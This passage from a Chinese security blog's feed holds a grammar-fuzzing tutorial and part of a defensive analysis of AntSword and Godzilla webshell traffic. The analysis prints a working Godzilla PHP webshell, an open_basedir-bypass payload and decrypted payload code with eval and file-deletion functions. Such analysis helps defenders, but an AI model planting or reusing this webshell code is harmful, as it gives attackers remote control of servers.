Fuzz的核心其实就是通过大量的符号扩展形成对应的数据结构，那么用来存储或者拓展符号的数据结构其实尤为重要。派生树的树状结构其实完美的符合了我们的要求，树形结构自上而下的扩展正好和符号的扩展相对应。而且<code>派生树使得我们可以掌控整个扩展过程的状态</code>，比如那些节点已经被扩展，或者某个节点是否需要扩展等，同时，在扩展过程中增加新节点的速度远超把一个符号替换为一个值的过程，因此使用这种数据结构也带来了一定的性能增益。</p><p>​  让我们以下面的Grammar为例子：</p><pre><code class="python"># URL GrammarURL_GRAMMAR: Grammar = {    "&lt;start&gt;":        ["&lt;url&gt;"],    "&lt;url&gt;":        ["&lt;scheme&gt;://&lt;authority&gt;&lt;path&gt;&lt;query&gt;"],    "&lt;scheme&gt;":        ["http", "https", "ftp", "ftps"],    "&lt;authority&gt;":        ["&lt;host&gt;", "&lt;host&gt;:&lt;port&gt;", "&lt;userinfo&gt;@&lt;host&gt;", "&lt;userinfo&gt;@&lt;host&gt;:&lt;port&gt;"],    "&lt;host&gt;":  # 大部分情况下其实可以指定一个URL        ["cispa.saarland", "www.google.com", "fuzzingbook.com"],    "&lt;port&gt;":        ["80", "8080", "&lt;nat&gt;"],    "&lt;nat&gt;":        ["&lt;digit&gt;", "&lt;digit&gt;&lt;digit&gt;"],    "&lt;digit&gt;":        ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],    "&lt;userinfo&gt;":  # Just one        ["user:password"],    "&lt;path&gt;":  # Just a few        ["", "/", "/&lt;id&gt;"],    "&lt;id&gt;":  # Just a few        ["abc", "def", "x&lt;digit&gt;&lt;digit&gt;"],    "&lt;query&gt;":        ["", "?&lt;params&gt;"],    "&lt;params&gt;":        ["&lt;param&gt;", "&lt;param&gt;&amp;&lt;params&gt;"],    "&lt;param&gt;":  # Just a few        ["&lt;id&gt;=&lt;id&gt;", "&lt;id&gt;=&lt;nat&gt;"],}</code></pre><p>以派生树算法来看，首先以<code>&lt;start&gt;</code>为初始节点，然后在Grammar中发现其存在对应的表达，所以就会选择<code>&lt;url&gt;</code>作为它的子节点，循环往复知道一个节点不再出现对应的子节点，然后整个的树形结构完成解析，输出对应的结构化数据。</p><p>​  对应的数据表示如下：</p><pre><code class="python">(SYMBOL_NAME, CHILDREN)DerivationTree = Tuple[str, Optional[List[Any]]]derivation_tree: DerivationTree = ("&lt;start&gt;",                   [("&lt;expr&gt;",                     [("&lt;expr&gt;", None),                      (" + ", []),                         ("&lt;term&gt;", None)]                     )])</code></pre><p><code>SYMBOL_NAME</code>代表的就是符号，CHILDREN代表子节点，表示为具体的数据结构就是：<code>DerivationTree = Tuple[str, Optional[List[Any]]]</code>。其中CHILDREN主要有两种表示：</p><ol><li>None代表当前节点可以继续向下扩展，其含义就是现在节点存在可扩展的符号。</li><li>[]代表的就是没有子节点了</li></ol><p>整个算法都围绕上面的基本原理展开</p><pre><code class="python">def g_rammar_fuzzer():    f = GrammarFuzzer(URL_GRAMMAR)    f.fuzz()</code></pre><h3 id="ProbabilisticGrammarFuzzer"><a href="#ProbabilisticGrammarFuzzer" class="headerlink" title="ProbabilisticGrammarFuzzer"></a>ProbabilisticGrammarFuzzer</h3><p>​  有时候完全随机的进行表达式展开其实会白白浪费大量的时间和资源，因此可以对表达式附加概率值，这一块涉及到大量的概率学问题，有部分数据来源于世界的统计规律，比如下面给出的<code>leaddigit</code>符号对应的概率，这些就不在深入分析。</p><pre><code class="python">PROBABILISTIC_EXPR_GRAMMAR: Grammar = {    "&lt;start&gt;":        ["&lt;expr&gt;"],    "&lt;expr&gt;":        [("&lt;term&gt; + &lt;expr&gt;", opts(prob=0.1)),         ("&lt;term&gt; - &lt;expr&gt;", opts(prob=0.2)),         "&lt;term&gt;"],    "&lt;term&gt;":        [("&lt;factor&gt; * &lt;term&gt;", opts(prob=0.1)),         ("&lt;factor&gt; / &lt;term&gt;", opts(prob=0.1)),         "&lt;factor&gt;"         ],    "&lt;factor&gt;":        ["+&lt;factor&gt;", "-&lt;factor&gt;", "(&lt;expr&gt;)",            "&lt;leadinteger&gt;", "&lt;leadinteger&gt;.&lt;integer&gt;"],    "&lt;leadinteger&gt;":        ["&lt;leaddigit&gt;&lt;integer&gt;", "&lt;leaddigit&gt;"],    # Benford's law: frequency distribution of leading digits    "&lt;leaddigit&gt;":        [("1", opts(prob=0.301)),         ("2", opts(prob=0.176)),         ("3", opts(prob=0.125)),         ("4", opts(prob=0.097)),         ("5", opts(prob=0.079)),         ("6", opts(prob=0.067)),         ("7", opts(prob=0.058)),         ("8", opts(prob=0.051)),         ("9", opts(prob=0.046)),         ],    # Remaining digits are equally distributed    "&lt;integer&gt;":        ["&lt;digit&gt;&lt;integer&gt;", "&lt;digit&gt;"],    "&lt;digit&gt;":        ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],}</code></pre><p>跟之前的Grammar有很大不同的地方在于，现在的Grammar可以通过增加注释的方式为列表中的值添加随机概率，使得作者可以通过逆向获取其它渠道得到的信息可以在Fuzz中获得利用。那现在问题就显而易见了，如何确定概率？</p><p>​  当Fuzz的作者没办法直接给出一个符号对应的所有项具体的概率的时候，可以遵循的最直接的规则就是下面三个公式：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220731/image-20220727074801193.2ln12v05bx40.png"></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220731/image-20220727074816609.10867094x8k0.png"></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220731/image-20220727074824325.1vqo9xj0oiw0.png"></p><p>大致含义也很好理解，就是a代表的是已知概率的项，而u代表的未知概率的项目，已知概率自然可以通过<code>opts</code>的方法给对应项附加概率，未知概率的项则按照概率平分的原则来赋予概率。之后自然是要在Fuzz里面引入概率，使得在生成种子的时候可以对符号解析的选择赋予权重，进而提高Fuzz效率。</p><p>​  就Fuzz的具体实现而言，其实相比于上述的Grammar Fuzz只是增加了一个对于opts注释的访问，以便在随机解析的时候可以附加概率值权重。但是这样带来的优势是很明显的，甚至可以通过控制输入Fuzz目标指定的Func等。但是还有一种情况，我第一次解析Grammar symbol的时候希望它的概率为0.3，但是我第二次解析Grammar symbol的时候希望其概率为0.5，为了实现这一点其实可以利用上下文，在不同的上下文中复制希望赋予其不同概率的symbol，以IP Grammar为例子：</p><pre><code class="python">IP_ADDRESS_GRAMMAR: Grammar = {    "&lt;start&gt;": ["&lt;address&gt;"],    "&lt;address&gt;": ["&lt;octet&gt;.&lt;octet&gt;.&lt;octet&gt;.&lt;octet&gt;"],    # ["0", "1", "2", ..., "255"]    "&lt;octet&gt;": decrange(0, 256) # 其实代表的就是0-256}</code></pre><p>为了使得每次解析<code>&lt;octet&gt;</code>的时候都使用不同的概率，可以对其扩展，形成下面的语法：</p><pre><code class="python">IP_ADDRESS_GRAMMAR: Grammar = {    "&lt;start&gt;": ["&lt;address&gt;"],    "&lt;address&gt;": ["&lt;octet-1&gt;.&lt;octet-2&gt;.&lt;octet-3&gt;.&lt;octet-4&gt;"],    # ["0", "1", "2", ..., "255"]    "&lt;octet-1&gt;": decrange(0, 256) # 其实代表的就是0-256    "&lt;octet-2&gt;": decrange(0, 256) # 其实代表的就是0-256    "&lt;octet-3&gt;": decrange(0, 256) # 其实代表的就是0-256    "&lt;octet-4&gt;": decrange(0, 256) # 其实代表的就是0-256}</code></pre><p>这样在进行解析的时候就完全可以对每次解析附加不同的概率。下面是帮助实现的函数：</p><pre><code class="python">def _duplicate_context(grammar: Grammar,                       orig_grammar: Grammar,                       symbol: str,                       expansion: Optional[Expansion],                       depth: Union[float, int],                       seen: Dict[str, str]) -&gt; None:    """Helper function for `duplicate_context()`"""    for i in range(len(grammar[symbol])):        if expansion is None or grammar[symbol][i] == expansion:            new_expansion = ""            for (s, c) in expansion_to_children(grammar[symbol][i]):                if s in seen:                 # Duplicated already                    new_expansion += seen[s]                elif c == [] or depth == 0:   # Terminal symbol or end of recursion                    new_expansion += s                else:                         # Nonterminal symbol - duplicate                    # Add new symbol with copy of rule                    new_s = new_symbol(grammar, s)                    grammar[new_s] = copy.deepcopy(orig_grammar[s])                    # Duplicate its expansions recursively                    # {**seen, **{s: new_s}} is seen + {s: new_s}                    _duplicate_context(grammar, orig_grammar, new_s, expansion=None,                                       depth=depth - 1, seen={**seen, **{s: new_s}})                    new_expansion += new_s            grammar[symbol][i] = new_expansiondef duplicate_context(grammar: Grammar,                       symbol: str,                      expansion: Optional[Expansion] = None,                       depth: Union[float, int] = float('inf')):    """Duplicate an expansion within a grammar.    In the given grammar, take the given expansion of the given `symbol`    (if `expansion` is omitted: all symbols), and replace it with a    new expansion referring to a duplicate of all originally referenced rules.    If `depth` is given, limit duplication to `depth` references    (default: unlimited)    """    orig_grammar = extend_grammar(grammar)    _duplicate_context(grammar, orig_grammar, symbol,                       expansion, depth, seen={})    # After duplication, we may have unreachable rules; delete them    for nonterminal in unreachable_nonterminals(grammar):        del grammar[nonterminal]</code></pre><p>在完成上下文复制之后就可以通过类似下面的操作得到我们想要的结果：</p><pre><code class="python">set_prob(probabilistic_ip_address_grammar, "&lt;octet-1&gt;", "127", 1.0)set_prob(probabilistic_ip_address_grammar, "&lt;octet-2&gt;", "0", 1.0)</code></pre><p>不过这就又引入一个问题，概率在赋予给symbol之后一成不变真的合适吗？在真实世界的Fuzz中随着我们对于目标的不断了解，或者一些其它情况比如长时间未出现想要的结果等，及时改变策略也是非常必要的，但是如果Fuzz可以智能的自己调节调整不同symbol的概率值的话，会减轻很多的负担并获得更好的软件测试效果。一个比较好的办法是让Fuzz通过最开始被给予Inputs种子来学习应该赋予某些symbol多大的一个概率值，这种方法在某些场景下非常有用：</p><ol><li>测试常用功能，因为很多软件测试更希望常用的功能确保安全，但是对于漏洞挖掘研究人员来说可能目标不在于此。</li><li>测试不常用功能，通过规避Inputs中解析到的symbol，Fuzz就会更偏向于测试一些不常用的功能。</li><li>专注于指定的Inputs，一些漏洞挖掘可能希望专注于已有的非常有价值的poc inputs，通过专注于这些inputs，Fuzz可以测试软件的一些薄弱环节从而达到很好的效果。</li></ol><p>​  理论已经存在，那么如何实现呢？第一步肯定是需要将已经存在的Inputs种子恢复成为派生树，然后对派生树种每个Symbol对应的值有多少来计算将来的概率值。</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220731/image-20220727103008425.4agknyqe2ly0.png"></p><p>如上图，假设我给与一个<code>127.0.0.1</code>的种子，那么被解析之后，0在<code>&lt;octet&gt;</code>中的概率值就会被限制为<code>50%</code>，127和1分别为<code>25%</code>，那么在Fuzz运行的时候相关的概率值就可以赋予给<code>&lt;octet&gt;</code>。那么如果测试一些不常用功能该怎么办呢？其实就是通过原来测常用功能的Inputs得到相关概率，然后进行概率翻转就行了，比如常用功能的Inputs概率如下：</p><pre><code>[('http', {'prob': 0.2222222222222222}), ('https', {'prob': 0.6666666666666666}), ('ftp', {'prob': 0.0}), ('ftps', {'prob': 0.1111111111111111})]</code></pre><p>那么经过翻转之后就是：</p><pre><code>[('http', {'prob': 0.1111111111111111}), ('https', {'prob': 0.0}), ('ftp', {'prob': 0.6666666666666666}), ('ftps', {'prob': 0.2222222222222222})]</code></pre><p>上述就是之前讲到的专注测试常用功能或者非常用功能的基本思路，从此处引出的另一个比较关键的是通过Inputs帮我们专注于目标的特定功能，它和测试常用功能的区别就是首先要找到一批特殊的Inputs，通过这些Inputs作为seeds就可以对语法解析的过程进行概率分析和限制，使得后续的变异可以一直有较高的目标命中率。</p><h3 id="Generator-With-Pre-or-Post-or-order-Func"><a href="#Generator-With-Pre-or-Post-or-order-Func" class="headerlink" title="Generator With Pre or Post or order Func"></a>Generator With Pre or Post or order Func</h3><p>​  在某些Inputs在生成的时候，Fuzz作者可能希望对他们进行一些限制调整，获取其它的操作，这些都可以通过<code>pre func</code>完成。这类似于hook，那么对于func触发的时机一般就分为两种，在Inputs的生成之前或者是生成之后，在语法里面的表示就是：</p><pre><code class="python">CHARGE_GRAMMAR: Grammar = {    "&lt;start&gt;": ["Charge &lt;amount&gt; to my credit card &lt;credit-card-number&gt;"],    "&lt;amount&gt;": ["$&lt;float&gt;"],    "&lt;float&gt;": ["&lt;integer&gt;.&lt;digit&gt;&lt;digit&gt;"],    "&lt;integer&gt;": ["&lt;digit&gt;", "&lt;integer&gt;&lt;digit&gt;"],    "&lt;digit&gt;": crange('0', '9'),    "&lt;credit-card-number&gt;": ["&lt;digits&gt;"],    "&lt;digits&gt;": ["&lt;digit-block&gt;&lt;digit-block&gt;&lt;digit-block&gt;&lt;digit-block&gt;"],    "&lt;digit-block&gt;": ["&lt;digit&gt;&lt;digit&gt;&lt;digit&gt;&lt;digit&gt;"],}CHARGE_GRAMMAR.update({    "&lt;float&gt;": [("&lt;integer&gt;.&lt;digit&gt;&lt;digit&gt;", opts(pre=high_charge))], # high_charge是函数名称})CHARGE_GRAMMAR.update({    "&lt;float&gt;": [("&lt;integer&gt;.&lt;digit&gt;&lt;digit&gt;",                 opts(pre=lambda: random.randint(10000000, 90000000) / 100.0))] # 或者选择使用lambda表达式})</code></pre><p>另一种就是在Seeds的生成之后了：</p><pre><code class="python">CHARGE_GRAMMAR.update({    "&lt;credit-card-number&gt;": [("&lt;digits&gt;", opts(post=lambda digits: fix_credit_card(digits)))]})</code></pre><p>比如生成的digits不能满足Fuzz的需求，我们就可以通过这种方式来进行及时的修正，以提高Fuzz的效率。</p><h3 id="Greybox-Fuzzing-with-Grammars"><a href="#Greybox-Fuzzing-with-Grammars" class="headerlink" title="Greybox Fuzzing with Grammars"></a>Greybox Fuzzing with Grammars</h3><p>​  除了Fuzzing性能类的问题之外的另一个问题就是变异的导向问题，在Grammars Fuzz生成Input的过程中对于Grammar的内部解析是随机的，但是对于Fuzz目标来说，大量的Input可能会触发相同的分支进而导致代码覆盖率难以达到理想的值。对于AFL类似的覆盖引导型Fuzz来说，因为白盒Fuzz的源代码插桩缘故可以统计代码覆盖率来进行不错的引导，但是还存在很多情况，比如黑盒，甚至是以一种WebServer为目标的Fuzz，统计代码覆盖率并不是一件简单的事情，这时候采取的措施应该是不断的增加Inputs生成的多样性，比如在上述的派生树的子节点的扩展过程进行统计，使其在生成Input语料的时候偏向于还没扩展过的节点。这时候就会面临新的问题，如何快速提升代码覆盖率？</p><p>​  在进行Fuzz的时候，有时候一些输入的部分会被识别为关键字，比如C语言里面的int等，如果告诉Fuzz这些关键字就可以在短时间内极大的提升代码覆盖率，但是就长远来看整体的代码覆盖率还是要差于不使用关键字字典的情况。下面是使用关键字字典的变异Inputs生成器。</p><pre><code class="python">class DictMutator(Mutator):    """Mutate strings using keywords from a dictionary"""    def __init__(self, dictionary: List[str]) -&gt; None:        """Constructor. `dictionary` is the list of keywords to use."""        super().__init__()        self.dictionary = dictionary        self.mutators.append(self.insert_from_dictionary)    def insert_from_dictionary(self, s: str) -&gt; str:        """Returns s with a keyword from the dictionary inserted"""        pos = random.randint(0, len(s))        random_keyword = random.choice(self.dictionary)        return s[:pos] + random_keyword + s[pos:]</code></pre><p>但是问题在于关键字通过字典随机引入的方式很可能破坏了Input本来的正确输入结构进而引发不必要的损耗。解决的方法其实也很简单：<code>Fuzzing with Input Fragments</code>.</p><ol><li>对原有的Input进行Parse，形成派生树。</li><li>对派生树进行节点互换或者节点替换等操作。</li><li>对派生树进行还原，形成新的Input。</li></ol><p>以上的所有操作都在派生树上进行。为了更方便的进行编译操作，可以建立一个派生树的碎片池，每个碎片都由子树组成，子树包括符号和对应的Node节点和其子节点。不过对于派生树的parse其实是非常耗时的，因此可以设置一些时间限制来防止速度过低。不过以Fragments为基础的变异虽然可以很好的符合Inputs合法性的要求但是在代码覆盖率提升方面并不亮眼。而且以此为基础的<code>LangFuzz</code>其实在Inputs生成的速度上也远低于平常的结构化黑盒Fuzz。下面是两组对比数据：</p><pre><code>LangFuzzFrom the 300 generated inputs, 152 (50.67%) can be parsed.In total, 91 statements are covered.BlackFuzzFrom the 300 generated inputs, 36 (12.00%) can be parsed.In total, 161 statements are covered.</code></pre><p>可以看出以Fragments为基础的变异的优势在于它可以很好的生成符合结构化语法的变异。那么现在的疑问就是如何在保证输入语法正确性的前提下提升代码覆盖率？</p><p>​  一种方法是利用类似AFL的覆盖引导方式，利用代码覆盖率不断作为变异的反馈，以此来不断的增添提高代码覆盖率的种子，同时提供<code>structural mutations</code>和<code>32 byte-level mutations</code>两种变异方式，如下：</p><pre><code class="python">class GreyboxGrammarFuzzer(GreyboxFuzzer):    """Greybox fuzzer using grammars."""    def __init__(self, seeds: List[str],                 byte_mutator: Mutator, tree_mutator: FragmentMutator,                 schedule: PowerSchedule) -&gt; None:        """Constructor.        `seeds` - set of inputs to mutate.        `byte_mutator` - a byte-level mutator.        `tree_mutator` = a tree-level mutator.        `schedule` - a power schedule.        """        super().__init__(seeds, byte_mutator, schedule)        self.tree_mutator = tree_mutator    def create_candidate(self) -&gt; str:        """Returns an input generated by structural mutation            of a seed in the population"""        seed = cast(SeedWithStructure, self.schedule.choose(self.population))        # Structural mutation        trials = random.randint(0, 4)        for i in range(trials):            seed = self.tree_mutator.mutate(seed)        # Byte-level mutation        candidate = seed.data        if trials == 0 or not seed.has_structure or random.randint(0, 1) == 1:            dumb_trials = min(len(seed.data), 1 &lt;&lt; random.randint(1, 5))            for i in range(dumb_trials):                candidate = self.mutator.mutate(candidate)        return candidate</code></pre><p>想通的种子和变异次数的条件下，测试结果如下：</p><pre><code class="python">From the 300 generated inputs, 1 (0.33%) can be parsed.In total, 180 statements are covered.</code></pre><p>同时，在Inputs生成的速度方面极大提升，较高的代码覆盖率，但是在Inputs的合法性方面表现是最差的。那这个问题该如何解决呢？答案就是<code>Fuzzing with Input Regions</code>，这种Fuzz的变异方法不再使用派生树节点拆分重组等方式，而是通过将合法种子的不同区域直接进行拆分重组的方式，这里的区域指的是可以和派生树符号对应的连续的字节序列，这样的好处其实在于它操作的对象可能比Fragments更大或者更小，以此种方式进行变异在和上述变异条件相同的情况下测试结构如下：</p><pre><code>It took the structural greybox fuzzer with region mutator        11.35 seconds to generate and execute 300 inputs.From the 300 generated inputs, 4 (1.33%) can be parsed.In total, 168 statements are covered.On average, 9.1% of a seed in the population can be successfully parsed.</code></pre><p>可以看到存在较高的代码覆盖率，在速度方面虽然优于Fragments Fuzz但是还是弱于普通的黑盒Fuzz，在代码覆盖率方面高于Fragments Fuzz并和GreyboxGrammarFuzzer维持在相差无几的水平。不过核心原因还是在于，通过的合法Inputs其实占比很低。那么如何解决这个问题？首先要让Fuzzer可以聚焦合法的Inputs。这一点其实前面已经讨论过了，只需要利用<code>schedule</code>给合法Inputs的相关结构赋予更多的权重。测试结果如下：</p><pre><code>It took AFLSmart 20.75 seconds to generate and execute 300 inputs.From the 300 generated inputs, 46 (15.33%) can be parsed.In total, 162 statements are covered.On average, 23.7% of a seed in the population can be successfully parsed.</code></pre><p>可以看出在代码覆盖率保持较高水平的情况下，Inputs的合法性也得到了大幅度的提升，但是在Inputs的生成速度上来看，还是远弱于普通的GrammarFuzz。</p><p>​  从上面可以看出，在选择Fuzz的时候本身就是一个取舍的问题，通过二次开发或者针对不同场景的选择才能更好的达到我们想要的结果。</p><h3 id="Parser-input"><a href="#Parser-input" class="headerlink" title="Parser input"></a>Parser input</h3><p>​  假设你在做一个模糊测试，无论是Grammar Fuzz 或者其他的Fuzz也好，如果没有合适的种子那么通过不断变异形成合适的Inputs是非常困难的，当然AFL的作者展示了通过简单的输入不断向目标进化的可能性，但是这毕竟十分浪费时间和性能，效果在很多场景下估计也是不尽人意的。</p><p>​  因此在进行模糊测试的时候如果可以获取一些poc，或者其它较好种子，比如在Fuzz js解释器的一个比较经常的做法就是将一些公开的poc，如下：</p><pre><code class="js">var haystack = "foo";var re_text = "^foo";haystack += "x";re_text += "(x)";var re = new RegExp(re_text);re.test(haystack);RegExp.input = Number();print(RegExp.$1);</code></pre><p>作为seeds进行变异，将生成的Inputs用来Fuzz解释器。表现出来不错的结果。</p><blockquote><p>Tips:如何判断对面的代码覆盖率，一般黑盒情况下可以试时间，如果一个Input在对面耗费了更多的时间来运行，那么可以猜测其走过了更多的代码分支。</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​  在面对Fuzz的目标的时候最重要的是选择合适的变异方式以及较好的初始种子，根据目标和测试目的不断地进行取舍和针对性开发才能得到比较理想的结果。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://www.fuzzingbook.org/">https://www.fuzzingbook.org</a></p><p>文中数据测试来源大多为Fuzzingbook，因为根据电脑不同，其实具体数值结果会有一定偏差，但是结论都是一样的，因此就展示了书中的测试数据。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Fuzzing之Grammars&quot;&gt;&lt;a href=&quot;#Fuzzing之Grammars&quot; class=&quot;headerlink&quot; title=&quot;Fuzzing之Grammars&quot;&gt;&lt;/a&gt;Fuzzing之Grammars&lt;/h1&gt;&lt;h2 id=&quot;Fuzzing-i</summary>
      
    
    
    
    <category term="漏洞挖掘" scheme="https://rainsec.cn/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="Fuzz" scheme="https://rainsec.cn/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>Webshell工具加密流量解析</title>
    <link href="https://rainsec.cn/post/Webshell%E5%B7%A5%E5%85%B7%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E8%A7%A3%E6%9E%90.html"/>
    <id>https://rainsec.cn/post/Webshell%E5%B7%A5%E5%85%B7%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E8%A7%A3%E6%9E%90.html</id>
    <published>2022-07-19T11:48:45.000Z</published>
    <updated>2022-07-22T11:58:15.159Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>webshell管理工具作为进一步信息收集、内网渗透、获取更高权限等功能的好帮手，常出现在攻防对抗和渗透测试场景下，其自带的流量加密用来绕过其waf、ids等安全设备的连接，这里简单说下蚁剑、哥斯拉、冰蝎3.0这三款较为流行的工具在默认情况下的流量加密方式和解密方法，可以帮助守方在复盘时更好的攻击链还原和检测。</p><h2 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h2><p>蚁剑的加密手段比较简单，在配置界面的加密手段只有base64和rot13，这两者都是无需密钥可直接进行解密的密码类型，这里以base64为例：<br><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220722/1.4jjh2zt6dim0.png"><br>提取参数后的编码直接进行base64解码：</p><pre><code class="base64">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb3BhcnI9cHJlZ19zcGxpdCgiL1xcXFx8XC8vIiwkb3BkaXIpOyRvY3dkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskdG1kaXI9Ii45ZjFlN2ZjODYiO0Bta2RpcigkdG1kaXIpO0BjaGRpcigkdG1kaXIpO0Bpbmlfc2V0KCJvcGVuX2Jhc2VkaXIiLCIuLiIpO2ZvcigkaT0wOyRpPHNpemVvZigkb3BhcnIpOyRpKyspe0BjaGRpcigiLi4iKTt9QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTtAcm1kaXIoJG9jd2QuIi8iLiR0bWRpcik7fTtmdW5jdGlvbiBhc2VuYygkb3V0KXtyZXR1cm4gQGJhc2U2NF9lbmNvZGUoJG91dCk7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiMzU4ZGMiLiI1MjQyYiI7ZWNobyBAYXNlbmMoJG91dHB1dCk7ZWNobyAiNzkiLiJlNTUiO31vYl9zdGFydCgpO3RyeXtwaHBpbmZvKCk7CmVjaG8gImtpZCIKCjt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7</code></pre><p>解密内容：</p><pre><code class="php">@ini_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$oparr=preg_split("/\\\\|\//",$opdir);$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$tmdir=".9f1e7fc86";@mkdir($tmdir);@chdir($tmdir);@ini_set("open_basedir","..");for($i=0;$i&lt;sizeof($oparr);$i++){@chdir("..");}@ini_set("open_basedir","/");@rmdir($ocwd."/".$tmdir);};function asenc($out){return @base64_encode($out);};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "358dc"."5242b";echo @asenc($output);echo "79"."e55";}ob_start();try{phpinfo();echo "kid";}catch(Exception $e){echo "ERROR://".$e-&gt;getMessage();};asoutput();die();</code></pre><h2 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h2><p>哥斯拉自带了几种加密方式，这里以php为例：分别为PHP_EVEAL_XOR_BASE64、PHP_XOR_BASE64、PHP_XOR_RAW为例。</p><h3 id="PHP-XOR-BASE64"><a href="#PHP-XOR-BASE64" class="headerlink" title="PHP_XOR_BASE64"></a>PHP_XOR_BASE64</h3><p>这个用哥斯拉生成的shell：</p><pre><code class="php">&lt;?php@session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){    for($i=0;$i&lt;strlen($D);$i++) {        $c = $K[$i+1&amp;15];        $D[$i] = $D[$i]^$c;    }    return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';if (isset($_POST[$pass])){    $data=encode(base64_decode($_POST[$pass]),$key);    if (isset($_SESSION[$payloadName])){        $payload=encode($_SESSION[$payloadName],$key);        if (strpos($payload,"getBasicsInfo")===false){            echo($payload);            $payload=encode($payload,$key);        }        eval($payload);        echo substr(md5($pass.$key),0,16);        echo base64_encode(encode(@run($data),$key));        echo substr(md5($pass.$key),16);    }else{        if (strpos($data,"getBasicsInfo")!==false){            $_SESSION[$payloadName]=encode($data,$key);        }    }}</code></pre><p>根据shell文件可以看出加密过程，先将pass传递内容base64解码，然后将内容与key进行异或操做，注意这里的key实际上是生成shell的key的32位md5的前16位。<br>那么我们根据这些即可写一个一次性的解码脚本，用第一次哥斯拉进行流量交互的payload为例（这里的key值为key）：<br><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220722/2.2l7h0knmmfe0.png"><br>将内容url解码后放入脚本中<br>脚本如下：</p><pre><code class="php">&lt;?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){    for($i=0;$i&lt;strlen($D);$i++) {        $c = $K[$i+1&amp;15];        $D[$i] = $D[$i]^$c;    }    return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';$post = "";#echo base64_decode($post);echo "&lt;br/&gt;";echo "&lt;br/&gt;";$data=encode(base64_decode($post),$key);echo $data;</code></pre><p>解密结果如下：</p><pre><code class="php">$parameters=array(); $_SES=array(); function run($pms){ global $ERRMSG; reDefSystemFunc(); $_SES=&amp;getSession(); @session_start(); $sessioId=md5(session_id()); if (isset($_SESSION[$sessioId])){ $_SES=unserialize((S1MiwYYr(base64Decode($_SESSION[$sessioId],$sessioId),$sessioId))); } @session_write_close(); if (canCallGzipDecode()==1&amp;&amp;@isGzipStream($pms)){ $pms=gzdecode($pms); } formatParameter($pms); if (isset($_SES["bypass_open_basedir"])&amp;&amp;$_SES["bypass_open_basedir"]==true){ @bypass_open_basedir(); } if (function_existsEx("set_error_handler")){ @set_error_handler("payloadErrorHandler"); } if (function_existsEx("set_exception_handler")){ @set_exception_handler("payloadExceptionHandler"); } $result=@evalFunc(); if ($result==null||$result===false){ $result=$ERRMSG; } if ($_SES!==null){ session_start(); $_SESSION[$sessioId]=base64_encode(S1MiwYYr(serialize($_SES),$sessioId)); @session_write_close(); } if (canCallGzipEncode()){ $result=gzencode($result,6); } return $result; } function payloadExceptionHandler($exception){ global $ERRMSG; $ERRMSG.="ExceptionMsg:".$exception-&gt;getMessage()."\r\n"; return true; } function payloadErrorHandler($errno, $errstr, $errfile=null, $errline=null,$errcontext=null){ global $ERRMSG; $ERRMSG.="ErrLine: {$errline} ErrorMsg:{$errstr}\r\n"; return true; } function S1MiwYYr($D,$K){ for($i=0;$istrlen($pms)-1){ break; } } } function evalFunc(){ @session_write_close(); $className=get("codeName"); $methodName=get("methodName"); $_SES=&amp;getSession(); if ($methodName!=null){ if (strlen(trim($className))&gt;0){ if ($methodName=="includeCode"){ return includeCode(); }else{ if (isset($_SES[$className])){ return eval($_SES[$className]); }else{ return "{$className} no load"; } } }else{ if (function_exists($methodName)){ return $methodName(); }else{ return "function {$methodName} not exist"; } } }else{ return "methodName Is Null"; } } function deleteDir($p){ $m=@dir($p); while(@$f=$m-&gt;read()){ $pf=$p."/".$f; @chmod($pf,0777); if((is_dir($pf))&amp;&amp;($f!=".")&amp;&amp;($f!="..")){ deleteDir($pf); @rmdir($pf); }else if (is_file($pf)&amp;&amp;($f!=".")&amp;&amp;($f!="..")){ @unlink($pf); } } $m-&gt;close(); @chmod($p,0777); return @rmdir($p); } function deleteFile(){ $F=get("fileName"); if(is_dir($F)){ return deleteDir($F)?"ok":"fail"; }else{ return (file_exists($F)?@unlink($F)?"ok":"fail":"fail"); } } function setFileAttr(){ $type = get("type"); $attr = get("attr"); $fileName = get("fileName"); $ret = "Null"; if 